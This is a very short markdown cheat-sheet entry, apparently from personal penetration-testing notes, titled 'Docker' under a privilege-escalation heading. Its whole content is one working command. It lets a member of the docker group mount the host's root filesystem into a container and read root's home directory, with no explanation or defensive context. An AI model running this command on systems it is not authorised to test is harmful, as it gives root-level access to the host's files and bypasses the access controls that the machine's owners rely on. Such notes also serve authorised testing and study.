---
title: "Docker"
date: 2024-7-3
tags: ["docker", "privesc"]
---

---
### Privesc

#### docker group

```bash
docker run -v /:/mnt -it bash bash

ls /mnt/root
```

<br>